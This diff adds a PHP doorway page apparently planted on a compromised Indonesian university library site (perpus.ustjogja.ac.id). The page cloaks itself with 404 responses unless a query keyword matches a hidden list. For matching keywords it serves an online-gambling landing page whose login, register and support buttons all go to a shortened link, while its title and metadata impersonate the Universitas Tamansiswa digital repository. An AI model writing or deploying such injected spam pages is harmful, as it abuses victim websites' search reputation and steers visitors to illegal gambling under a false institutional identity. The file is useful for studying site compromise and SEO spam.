@@ -1,0 +1,75 @@
+<?php
+function feedback404()
+{
+    header("HTTP/1.0 404 Not Found");
+    echo "404 Not Found.";
+}
+if (isset($_GET['games'])) {
+    $filename = "kecap.txt";
+    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $target_string = strtolower($_GET['games']);
+    foreach ($lines as $item) {
+        if (strtolower($item) === $target_string) {
+            $BRAND = strtoupper($target_string);
+        }
+    }
+    if (isset($BRAND)) {
+        $BRANDS = $BRAND;
+        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+        if (isset($fullUrl)) {
+            $parsedUrl = parse_url($fullUrl);
+            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
+            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
+            $urlPath = $baseUrl;
+        } else {
+            echo "URL saat ini tidak didefinisikan.";
+        }
+    } else {
+        feedback404();
+        exit();
+    }
+} else {
+    feedback404();
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html amp lang="en-ID">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title><?php echo $BRANDS ?> : Perpustakaan Digital & Repository Universitas Tamansiswa</title>
+    <meta name="description" content="<?php echo $BRANDS ?> menyediakan akses katalog online, koleksi digital berupa e‑book, jurnal, skripsi dan tesis melalui sistem LibUST yang terintegrasi dengan jaringan perpustakaan nasional." />
+    <meta name="robots" content="index,follow" />
+    <link href="https://files.sitestatic.net/banners/20240823005231000000f9073faf00MKPAFAA__2334x1167.jpg" rel="shortcut icon" type="image/x-icon" />
+    <link rel="canonical" href="https://perpus.ustjogja.ac.id/<?php echo $BRANDS ?>" />
+    <meta property="og:url" content="https://perpus.ustjogja.ac.id/<?php echo $BRANDS ?>" />
+    <meta property="og:site_name" content="<?php echo $BRANDS ?>" />
+    <meta property="og:image:alt" content="<?php echo $BRANDS ?>" />
+    <meta property="og:image" content="https://files.sitestatic.net/banners/20240823005231000000f9073faf00MKPAFAA__2334x1167.jpg" />
+    <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js" />
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style>
+    <noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <style amp-custom>*{box-sizing:border-box}body{font-family:monospace;position:relative;background:#000;background-image:radial-gradient(#000 5%,#000 50%);background-size:5px 5px;background-attachment:fixed}.container{max-width:400px;height:100vh;margin:0 auto;padding:15px;display:flex;flex-direction:column;justify-content:center;overflow:hidden}.welcome{max-width:350px;margin:0 auto}.welcome h1{font-size:12px;color:#fff;overflow:hidden;border-right:.15em solid #BC0707;white-space:nowrap;letter-spacing:.09em;animation:typing 3.5s steps(40,end),blink-caret .75s step-end infinite}@keyframes typing{from{width:0}to{width:100%}}@keyframes blink-caret{from,to{border-color:transparent}50%{border-color:#BC0707}}.banner{border-radius:10px}.btn-login{padding:10px;color:#000;font-size:20px;font-weight:700;text-decoration:none;text-align:center;background:linear-gradient(to bottom,#BC0707 100%,rgb(0 0 0) 0);margin-top:10px;border-radius:10px;position:relative;z-index:2;box-shadow:0 0 10px #BC0707}.btn-daftar{padding:10px;color:#fff;font-size:20px;font-weight:700;text-decoration:none;text-align:center;background:linear-gradient(to bottom,#BC0707 100%,red 0);margin-top:10px;border-radius:10px;position:relative;z-index:2;box-shadow:0 0 10px #BC0707}.copyright{text-align:center;color:#ffffff96}.nagaterbang{position:fixed;z-index:1;left:0;right:0;top:0;bottom:0;margin:auto}</style>
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <center>
+          <amp-img id="image" class="animated tada infinite slower" src="https://files.sitestatic.net/ImageFile/202402221224470000004b160194abMKPAFAA__1095x305.gif" alt=" <?php echo $BRANDS ?>" width="310" height="80" layout="intrinsic"></amp-img>
+      </header>
+      <amp-img src="https://files.sitestatic.net/banners/20240823005231000000f9073faf00MKPAFAA__2334x1167.jpg" width="325" height="240" layout="intrinsic" class="banner"></amp-img>
+
+      <a href="https://ibit.ly/tunelraja168" target="_blank" rel="noreferrer noopener" role="button" class="btn-daftar">LOGIN RESMI <?php echo $BRANDS ?></a>
+      <a href="https://ibit.ly/tunelraja168" target="_blank" rel="noreferrer noopener" role="button" class="btn-daftar">DAFTAR AKUN VIP</a>
+      <a href="https://ibit.ly/tunelraja168" target="_blank" rel="noreferrer noopener" role="button" class="btn-daftar">CS <?php echo $BRANDS ?> 24 JAM ONLINE</a>
+      <p class="copyright"> Copyright © <?php echo $BRANDS ?>. All rights Reserved. <a style="color: #ffffff;" href="https://perpus.ustjogja.ac.id/<?php echo $BRANDS ?>"></a>
+      </p>
+    </div>
+  </body>
+</html>
